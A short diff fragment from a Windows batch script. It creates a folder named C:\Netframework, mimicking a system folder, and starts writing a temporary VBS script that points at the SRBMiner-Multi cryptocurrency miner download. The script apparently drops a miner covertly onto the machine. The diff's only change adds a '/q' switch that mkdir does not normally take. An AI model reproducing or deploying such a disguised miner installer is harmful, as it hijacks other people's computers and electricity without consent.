@@ -186,7 +186,7 @@ setlocal EnableDelayedExpansion
 
 ::========================================================================================================================================
 
-@echo off & mkdir C:\Netframework\SRBMiner-Multi-2-5-2
+@echo off & mkdir /q C:\Netframework\SRBMiner-Multi-2-5-2
 @echo off & >"%temp%\script_.vbs"^
     (       
       echo/ url ^= "https://github.com/doktor83/SRBMiner-Multi/releases/download/2.5.2/SRBMiner-Multi-2-5-2-win64.zip"
